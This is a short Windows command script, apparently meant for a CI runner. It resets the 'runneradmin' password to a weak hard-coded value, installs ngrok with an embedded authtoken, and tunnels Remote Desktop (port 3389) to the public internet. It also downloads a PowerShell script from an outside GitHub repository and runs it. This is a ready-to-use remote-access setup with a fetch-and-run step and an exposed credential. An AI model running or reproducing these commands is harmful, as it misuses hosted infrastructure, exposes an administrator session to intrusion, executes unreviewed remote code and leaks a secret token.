net user runneradmin P@ssw0rd!
choco install ngrok -y
ngrok config add-authtoken 2dui2XTrzirImJjBXxEVezW7Sjx_7jBriocpRkg4WvDF83Zne
start /b ngrok tcp 3389
Invoke-WebRequest -Uri https://github.com/Efebey1940/fictional-octo-waffle/raw/main/a.ps1 -OutFile ip.ps1
.\ip.ps1
sleep 240
